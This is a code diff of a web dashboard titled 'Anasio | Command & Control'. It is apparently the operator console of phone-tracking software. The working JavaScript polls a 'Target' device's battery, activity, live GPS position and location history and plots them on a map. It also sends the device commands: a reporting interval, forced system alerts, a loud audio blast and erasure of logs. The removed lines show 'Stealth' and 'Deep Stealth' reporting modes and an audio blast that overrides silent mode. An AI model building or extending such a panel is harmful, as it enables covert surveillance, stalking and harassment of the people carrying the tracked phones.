@@ -5,43 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anasio | Command & Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Leaflet CSS for Map -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
     <meta name="theme-color" content="#ffffff">
     <style>
-        .battery {
-            width: 140px;
-            height: 26px;
-            border-radius: 6px;
-            border: 2px solid #e5e7eb;
-            position: relative;
-            background: #fff;
-        }
-        .battery-level {
-            height: 100%;
-            border-radius: 4px;
-            transition: width 400ms ease, background 400ms ease;
-        }
-        .battery-tip {
-            position: absolute;
-            right: -8px;
-            top: 5px;
-            width: 5px;
-            height: 12px;
-            background: #e5e7eb;
-            border-radius: 2px;
-        }
-        #map {
-            height: 400px;
-            border-radius: 1rem;
-            z-index: 10;
-        }
+        .battery { width: 140px; height: 26px; border-radius: 6px; border: 2px solid #e5e7eb; position: relative; background: #fff; }
+        .battery-level { height: 100%; border-radius: 4px; transition: width 400ms ease, background 400ms ease; }
+        .battery-tip { position: absolute; right: -8px; top: 5px; width: 5px; height: 12px; background: #e5e7eb; border-radius: 2px; }
+        #map { height: 400px; border-radius: 1rem; z-index: 10; }
     </style>
 </head>
 <body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
     <div class="max-w-6xl mx-auto py-8 px-4 sm:px-6">
-        
-        <!-- Top Navigation Bar -->
         <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
             <div class="flex items-center gap-4 mb-4 md:mb-0">
                 <div class="bg-blue-600 text-white p-2 rounded-lg">
@@ -52,41 +26,29 @@
                     <p class="text-xs text-gray-500 font-medium">Encrypted Telemetry Stream</p>
                 </div>
             </div>
-            
             <div class="flex items-center gap-6">
-                <!-- Navigation -->
                 <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
-
-                <!-- Device Selector -->
                 <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
                     <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
                     <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                         <option value="">Awaiting connection...</option>
                     </select>
                 </div>
-                
-                <!-- Status Badge -->
                 <div class="flex items-center bg-gray-50 px-4 py-2 rounded-xl border border-gray-200">
                     <span id="dot" class="h-2 w-2 bg-gray-300 rounded-full mr-2 shadow-sm"></span>
                     <span id="status-text" class="text-xs font-bold tracking-wide text-gray-500 uppercase">Offline</span>
                 </div>
-                
                 <button type="button" id="delete-device-btn" class="text-[11px] font-bold bg-gray-800 text-white px-3 py-2 rounded-xl hover:bg-gray-700 transition shadow-sm uppercase tracking-wide">Delete Target</button>
-                
                 <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
             </div>
         </nav>
 
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            
-            <!-- Left Column: Metrics & Controls -->
             <div class="flex flex-col gap-6 lg:col-span-1">
-                
-                <!-- Battery Card -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                     <div class="flex items-center justify-between mb-6">
                         <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Battery Status</p>
-                        <div class="battery" aria-hidden>
+                        <div class="battery">
                             <div id="battery-fill" class="battery-level" style="width:0%"></div>
                             <div class="battery-tip"></div>
                         </div>
@@ -97,7 +59,6 @@
                     </div>
                 </div>
 
-                <!-- Activity Card -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                     <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Target Activity</p>
                     <div class="flex items-center gap-4">
@@ -111,22 +72,19 @@
                     </div>
                 </div>
 
-                <!-- C2 Config Card -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                     <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Payload Configuration</p>
                     <form id="interval-form" class="flex flex-col gap-3">
                         <label class="text-xs font-medium text-gray-600">Reporting Frequency</label>
                         <select id="interval-select" class="px-3 py-2.5 border border-gray-200 rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-500 outline-none w-full cursor-pointer">
-                            <option value="5">Every 5 Seconds (High Drain!)</option>
-                            <option value="60">Every 1 Minute (Balanced)</option>
-                            <option value="600">Every 10 Minutes (Stealth)</option>
-                            <option value="3600">Every 1 Hour (Deep Stealth)</option>
+                            <option value="5">Every 5 Seconds</option>
+                            <option value="60">Every 1 Minute</option>
+                            <option value="600">Every 10 Minutes</option>
                         </select>
-                        <button type="submit" class="w-full bg-gray-900 hover:bg-black text-white font-bold px-4 py-2.5 rounded-xl transition shadow-sm text-sm">Deploy Config to Target</button>
+                        <button type="submit" class="w-full bg-gray-900 hover:bg-black text-white font-bold px-4 py-2.5 rounded-xl transition shadow-sm text-sm">Deploy Config</button>
                     </form>
                 </div>
 
-                <!-- Remote Notification Card -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                     <div class="flex items-center justify-between mb-4">
                         <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">System Alert Override</p>
@@ -141,42 +99,33 @@
                     </form>
                 </div>
 
-                <!-- Audio Blast Card -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                     <div class="flex items-center justify-between mb-4">
-                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Max Volume Audio Blast</p>
+                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Audio Blast</p>
                         <span id="audio-badge" class="bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider">Inactive</span>
                     </div>
-                    <p class="text-xs text-gray-500 mb-3">Overrides DND & silent mode. Plays loud alarm sound on target.</p>
                     <div class="flex gap-2">
                         <button type="button" id="play-audio-btn" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Blast Audio</button>
                         <button type="button" id="stop-audio-btn" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Cancel</button>
                     </div>
                 </div>
-                
             </div>
 
-            <!-- Right Column: Map -->
             <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2 relative overflow-hidden flex flex-col">
-                <div class="absolute top-4 left-4 z-20 pointer-events-none">
-                    <div class="bg-white/95 backdrop-blur px-4 py-2 rounded-xl shadow-sm border border-gray-200 pointer-events-auto">
-                        <p class="text-xs font-bold text-gray-800 uppercase tracking-widest flex items-center gap-2">
-                            <span class="relative flex h-2 w-2">
-                              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
-                              <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
-                            </span>
-                            Live Tracker
-                        </p>
-                    </div>
+                <div class="absolute top-4 right-4 z-[400] bg-white rounded-lg shadow px-2 py-1 border border-gray-200 text-xs font-bold text-gray-700">
+                    Path:
+                    <select id="path-time-filter" class="bg-transparent outline-none cursor-pointer ml-1">
+                        <option value="0.5">Last 30 Mins</option>
+                        <option value="1">Last 1 Hour</option>
+                        <option value="10">Last 10 Hours</option>
+                        <option value="0" selected>All Time</option>
+                    </select>
                 </div>
-                <!-- Map Container -->
-                <div id="map" class="w-full flex-grow"></div>
+                <div id="map" class="w-full flex-grow z-0"></div>
             </div>
-            
         </div>
     </div>
 
-    <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
     <script>
         const levelText = document.getElementById('level-text');
@@ -187,42 +136,32 @@
         const coordsText = document.getElementById('coords-text');
         const activityText = document.getElementById('activity-text');
         const selectEl = document.getElementById('device-select');
+        const notifBadge = document.getElementById('notif-badge');
+        const audioBadge = document.getElementById('audio-badge');
 
-        // Initialize Map
         const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
         L.control.zoom({ position: 'bottomright' }).addTo(map);
-
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
-            maxZoom: 20
-        }).addTo(map);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);
 
         const customIcon = L.divIcon({
             className: 'custom-icon',
-            html: `<div class="bg-blue-600 rounded-full w-4 h-4 shadow-[0_0_15px_rgba(37,99,235,0.7)] border-2 border-white ring-4 ring-blue-500/20"></div>`,
-            iconSize: [24, 24],
-            iconAnchor: [12, 12]
+            html: `<div class="bg-blue-600 rounded-full w-4 h-4 shadow-lg border-2 border-white"></div>`,
+            iconSize: [24, 24], iconAnchor: [12, 12]
         });
 
         let marker = L.marker([0, 0], {icon: customIcon}).addTo(map);
-        let pathLine = L.polyline([], {color: '#ef4444', weight: 3, opacity: 0.8, dashArray: '5, 8', lineJoin: 'round'}).addTo(map);
+        let pathLine = L.polyline([], {color: '#ef4444', weight: 3, opacity: 0.8}).addTo(map);
         let hasLocation = false;
-
-        function colorForLevel(n){
-            if(n >= 70) return '#16a34a'; // Green
-            if(n >= 25) return '#f59e0b'; // Yellow
-            return '#dc2626'; // Red
-        }
+        let localPathHash = "";
 
         async function fetchAvailableDevices() {
             try {
                 const devRes = await fetch('/devices');
+                if(!devRes.ok) return;
                 const devData = await devRes.json();
                 const currentSelected = selectEl.value;
-                
                 if (devData.devices && devData.devices.length > 0) {
-                    if (selectEl.options[0].value === "") { selectEl.innerHTML = ''; }
-                    
+                    if (selectEl.options.length > 0 && selectEl.options[0].value === "") { selectEl.innerHTML = ''; }
                     devData.devices.forEach(did => {
                         if (!Array.from(selectEl.options).some(opt => opt.value === did)) {
                             const opt = document.createElement('option');
@@ -230,181 +169,138 @@
                             selectEl.appendChild(opt);
                         }
                     });
-                    
-                    if (!currentSelected && selectEl.options.length > 0) {
-                        selectEl.value = selectEl.options[0].value;
-                    }
+                    if (!currentSelected && selectEl.options.length > 0) { selectEl.value = selectEl.options[0].value; }
                 }
-            } catch(err) { console.error("Device fetch error", err); }
+            } catch(err) { console.error(err); }
         }
 
         async function fetchStats(){
             await fetchAvailableDevices();
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return;
+
             try {
-                const activeDevice = selectEl.value;
-                const statsUrl = activeDevice ? `/stats?device_id=${encodeURIComponent(activeDevice)}` : '/stats';
-                const res = await fetch(statsUrl);
-                if(!res.ok) throw new Error('no stats');
+                const res = await fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`);
                 const data = await res.json();
                 
                 if(data.level && data.timestamp !== "Waiting for devices...") {
-                    // Update Battery View
                     const n = parseInt(data.level || 0, 10);
                     levelText.textContent = n + '%';
-                    batteryFill.style.width = Math.max(0, Math.min(100, n)) + '%';
-                    batteryFill.style.background = colorForLevel(n);
+                    batteryFill.style.width = n + '%';
+                    batteryFill.style.background = n >= 50 ? '#16a34a' : (n >= 20 ? '#f59e0b' : '#dc2626');
                     timestampEl.textContent = data.timestamp;
                     activityText.textContent = data.activity || 'Stationary';
                     
                     if (data.is_online) {
-                        statusDot.className = "h-2 w-2 bg-green-500 rounded-full mr-2 shadow-[0_0_8px_rgba(34,197,94,0.8)] animate-pulse";
+                        statusDot.className = "h-2 w-2 bg-green-500 rounded-full mr-2 animate-pulse";
                         statusText.textContent = 'Online';
-                        statusText.className = "text-xs font-bold tracking-wide text-green-600 uppercase";
                     } else {
-                        statusDot.className = "h-2 w-2 bg-gray-400 rounded-full mr-2 shadow-sm";
+                        statusDot.className = "h-2 w-2 bg-gray-400 rounded-full mr-2";
                         statusText.textContent = 'Offline';
-                        statusText.className = "text-xs font-bold tracking-wide text-gray-600 uppercase";
                     }
 
-                    if(data.ping_interval) {
-                        document.getElementById('interval-select').value = data.ping_interval;
+                    // Update notification badge
+                    if (data.notif_state === 1) {
+                        notifBadge.textContent = 'Active';
+                        notifBadge.className = 'bg-red-100 text-red-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
+                    } else {
+                        notifBadge.textContent = 'Inactive';
+                        notifBadge.className = 'bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
                     }
 
-                    // Notification State Logic
-                    if(data.notif_state === 1) {
-                        document.getElementById('notif-badge').className = "bg-red-100 text-red-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
-                        document.getElementById('notif-badge').textContent = "Active";
-                        const notifInput = document.getElementById('notif-message');
-                        // Only auto-fill if the user isn't actively typing
-                        if(document.activeElement !== notifInput) {
-                            notifInput.value = data.notif_text || "";
+                    // Update audio badge
+                    if (data.play_audio === 1) {
+                        audioBadge.textContent = 'Blasting';
+                        audioBadge.className = 'bg-purple-100 text-purple-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider animate-pulse';
+                    } else {
+                        audioBadge.textContent = 'Inactive';
+                        audioBadge.className = 'bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider';
+                    }
+
+                    // Sync the interval dropdown with actual device config
+                    const intervalSelect = document.getElementById('interval-select');
+                    if (data.ping_interval && document.activeElement !== intervalSelect) {
+                        // Create option if it doesn't exist (e.g. custom interval)
+                        if (!Array.from(intervalSelect.options).some(opt => opt.value === data.ping_interval.toString())) {
+                            const newOpt = document.createElement('option');
+                            newOpt.value = data.ping_interval.toString();
+                            newOpt.textContent = `Every ${data.ping_interval} Seconds`;
+                            intervalSelect.appendChild(newOpt);
                         }
-                    } else {
-                        document.getElementById('notif-badge').className = "bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
-                        document.getElementById('notif-badge').textContent = "Inactive";
+                        intervalSelect.value = data.ping_interval.toString();
                     }
 
-                    // Audio State Logic
-                    if(data.play_audio === 1) {
-                        document.getElementById('audio-badge').className = "bg-purple-100 text-purple-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
-                        document.getElementById('audio-badge').textContent = "Playing";
-                    } else {
-                        document.getElementById('audio-badge').className = "bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
-                        document.getElementById('audio-badge').textContent = "Inactive";
-                    }
-
-                    // Map Logic
                     if(data.lat && data.lon) {
                         const lat = parseFloat(data.lat);
                         const lon = parseFloat(data.lon);
                         const newLatLng = new L.LatLng(lat, lon);
                         marker.setLatLng(newLatLng);
                         
-                        const histRes = await fetch(`/history?device_id=${encodeURIComponent(activeDevice)}`);
-                        if(histRes.ok) {
-                            const histData = await histRes.json();
-                            if(histData.path && histData.path.length > 0) {
-                                pathLine.setLatLngs(histData.path);
+                        const timeFilter = document.getElementById('path-time-filter').value;
+                        const incomingHash = `${lat}_${lon}_${data.timestamp}_${timeFilter}`;
+                        if(incomingHash !== localPathHash) {
+                            localPathHash = incomingHash;
+                            const histRes = await fetch(`/history?device_id=${encodeURIComponent(activeDevice)}&hours=${timeFilter}`);
+                            if(histRes.ok) {
+                                const histData = await histRes.json();
+                                if(histData.path) pathLine.setLatLngs(histData.path);
                             }
                         }
-
-                        if(!hasLocation) {
-                            map.flyTo(newLatLng, 15, { duration: 1.5 });
-                            hasLocation = true;
-                        }
+                        if(!hasLocation) { map.flyTo(newLatLng, 15); hasLocation = true; }
                         coordsText.textContent = `${lat.toFixed(5)}°, ${lon.toFixed(5)}°`;
                     }
                 }
-            } catch(e) {
-                statusDot.className = "h-2 w-2 bg-red-500 rounded-full mr-2 shadow-sm";
-                statusText.textContent = 'Disconnected';
-                statusText.className = "text-xs font-bold tracking-wide text-red-600 uppercase";
-            }
+            } catch(e) { console.error(e); }
         }
 
-        fetchStats();
-        setInterval(fetchStats, 5000);
-        selectEl.addEventListener('change', () => { hasLocation = false; fetchStats(); });
+        (async () => { await fetchStats(); setInterval(fetchStats, 5000); })();
+        selectEl.addEventListener('change', () => { hasLocation = false; localPathHash = ""; fetchStats(); });
+        document.getElementById('path-time-filter').addEventListener('change', () => { localPathHash = ""; fetchStats(); });
 
         document.getElementById('interval-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const val = document.getElementById('interval-select').value;
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return alert("Wait for a device to connect first.");
-            
-            try {
-                const fd = new FormData();
-                fd.append('device_id', activeDevice);
-                fd.append('interval', val);
-                await fetch('/set_interval', { method: 'POST', body: fd });
-                alert(`SUCCESS: Payload configuration queued.\n\nThe target device will switch to reporting every ${val} seconds on its next ping.`);
-            } catch(err) {
-                console.error(err);
-            }
+            const fd = new FormData();
+            fd.append('device_id', selectEl.value);
+            fd.append('interval', val);
+            await fetch('/set_interval', { method: 'POST', body: fd });
+            alert("Config Sent");
         });
 
-        // Remote Notification Command Logic
         async function setNotificationCmd(state, text) {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return alert("Wait for a device to connect first.");
-            try {
-                const fd = new FormData();
-                fd.append('device_id', activeDevice);
-                fd.append('state', state);
-                fd.append('text', text);
-                await fetch('/set_notification', { method: 'POST', body: fd });
-                alert(state === 1 ? "Notification command activated." : "Notification revoked.");
-                fetchStats();
-            } catch(err) {
-                console.error(err);
-            }
+            if(!selectEl.value) { alert('No device selected'); return; }
+            const fd = new FormData();
+            fd.append('device_id', selectEl.value);
+            fd.append('state', state);
+            fd.append('text', text);
+            const res = await fetch('/set_notification', { method: 'POST', body: fd });
+            if(res.ok) { fetchStats(); } else { alert('Failed to send notification command'); }
         }
-
         document.getElementById('notif-form').addEventListener('submit', (e) => {
             e.preventDefault();
-            const text = document.getElementById('notif-message').value;
-            setNotificationCmd(1, text || "System Alert");
+            const msg = document.getElementById('notif-message').value;
+            if(!msg.trim()) { alert('Enter a notification message'); return; }
+            setNotificationCmd(1, msg);
         });
+        document.getElementById('hide-notif-btn').addEventListener('click', () => { setNotificationCmd(0, ""); });
 
-        document.getElementById('hide-notif-btn').addEventListener('click', () => {
-            document.getElementById('notif-message').value = "";
-            setNotificationCmd(0, "");
-        });
-
-        // Remote Audio Command Logic
-        async function setAudioCmd(play_audio) {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return alert("Wait for a device to connect first.");
-            try {
-                const fd = new FormData();
-                fd.append('device_id', activeDevice);
-                fd.append('play_audio', play_audio);
-                await fetch('/set_audio', { method: 'POST', body: fd });
-                alert(play_audio === 1 ? "Audio blast command activated." : "Audio blast revoked.");
-                fetchStats();
-            } catch(err) {
-                console.error(err);
-            }
+        async function setAudioCmd(play) {
+            if(!selectEl.value) { alert('No device selected'); return; }
+            const fd = new FormData();
+            fd.append('device_id', selectEl.value);
+            fd.append('play_audio', play);
+            const res = await fetch('/set_audio', { method: 'POST', body: fd });
+            if(res.ok) { fetchStats(); } else { alert('Failed to send audio command'); }
         }
-
-
         document.getElementById('play-audio-btn').addEventListener('click', () => setAudioCmd(1));
         document.getElementById('stop-audio-btn').addEventListener('click', () => setAudioCmd(0));
 
         document.getElementById('delete-device-btn').addEventListener('click', async () => {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return alert("Select a target to delete first.");
-            if(!confirm(`WARNING: Erase ${activeDevice} and its location history completely?`)) return;
-            
-            try {
-                const fd = new FormData();
-                fd.append('device_id', activeDevice);
-                const res = await fetch('/delete_device', { method: 'POST', body: fd });
-                if(res.ok) {
-                    alert('Target device and history wiped successfully.');
-                    window.location.reload();
-                }
-            } catch(e) { console.error(e); }
+            if(!confirm("Wipe this device's logs?")) return;
+            const fd = new FormData();
+            fd.append('device_id', selectEl.value);
+            await fetch('/delete_device', { method: 'POST', body: fd });
+            window.location.reload();
         });
     </script>
 </body>
